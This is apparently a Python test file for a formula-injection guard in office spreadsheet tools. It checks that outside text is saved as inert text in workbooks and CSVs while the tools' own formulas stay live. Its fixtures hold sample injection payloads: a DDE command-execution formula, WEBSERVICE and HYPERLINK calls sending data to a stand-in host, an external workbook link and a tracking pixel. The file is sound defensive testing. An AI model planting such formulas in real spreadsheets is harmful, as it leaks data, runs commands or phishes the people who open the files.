"""Formula-injection guard (security review 09/29/2026): outside text must never become a live formula in a
workbook or CSV the office opens, while the tools' own formulas (sums, lookups, QBO links) stay live."""
import subprocess
import sys
import zipfile
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

import shared  # noqa: E402,F401  (arms the save guard, as every tool does)
from shared import xlsx_guard as g  # noqa: E402
from shared.xlsx_verify import verify_xlsx  # noqa: E402

HOSTILE = {
    "A1": '=HYPERLINK("http://evil.example/pay","INV 1234")',
    "A2": '=WEBSERVICE("http://evil.example/?"&B5)',
    "A3": "=cmd|' /C calc'!A0",
    "A4": "='C:\\x\\[book.xlsx]Sheet1'!A1",
    "A5": '=IMAGE("https://evil.example/pixel.png")',
}
OURS = {
    "B1": '=HYPERLINK("https://qbo.intuit.com/app/bill?txnId=1","↗")',
    "B2": '=SUMIFS(C:C,D:D,"x")',
    "B3": "=IFERROR(C2/D2,0)",
    "B4": "=SUM(Table1[Amount])",                  # a structured table reference is not another workbook
}


def test_rule():
    for f in HOSTILE.values():
        assert g.formula_risk(f), f
    for f in OURS.values():
        assert g.formula_risk(f) is None, f
    assert g.formula_risk('=HYPERLINK("https://qbo.intuit.com.evil.example/x")')   # look-alike host


def test_save_guard_turns_hostile_formulas_into_text(tmp_path):
    import openpyxl
    wb = openpyxl.Workbook()
    ws = wb.active
    for k, v in {**HOSTILE, **OURS}.items():
        ws[k] = v
    p = tmp_path / "t.xlsx"
    wb.save(p)
    back = openpyxl.load_workbook(p).active
    for k, v in HOSTILE.items():
        assert back[k].data_type == "s" and back[k].value == v      # kept, visible, inert
    for k in OURS:
        assert back[k].data_type == "f"                               # our formulas stay live
    assert verify_xlsx(p) == []


def test_tripwire_catches_a_file_saved_without_the_guard(tmp_path):
    p = tmp_path / "raw.xlsx"
    code = ("import openpyxl; wb=openpyxl.Workbook(); wb.active['C3']='=WEBSERVICE(\"http://evil.example\")'; "
            f"wb.save(r'{p}')")
    subprocess.run([sys.executable, "-c", code], check=True)           # a fresh process: no guard installed
    with zipfile.ZipFile(p) as z:
        assert b"<f>" in z.read("xl/worksheets/sheet1.xml")
    issues = verify_xlsx(p)
    assert any("calls WEBSERVICE" in i for i in issues), issues


def test_text_writer_and_csv():
    import openpyxl
    ws = openpyxl.Workbook().active
    assert g.put(ws, 1, 1, "=1+1").data_type == "s"
    assert g.put(ws, 2, 1, 42).value == 42
    assert g.csv_cell("=HYPERLINK(1)") == "'=HYPERLINK(1)"
    assert g.csv_cell("@SUM(1)") == "'@SUM(1)"
    assert g.csv_cell("-1,234.50") == "-1,234.50"                      # a real negative number is left alone
    assert g.csv_cell("- see memo") == "'- see memo"
    assert g.csv_cell(12) == 12
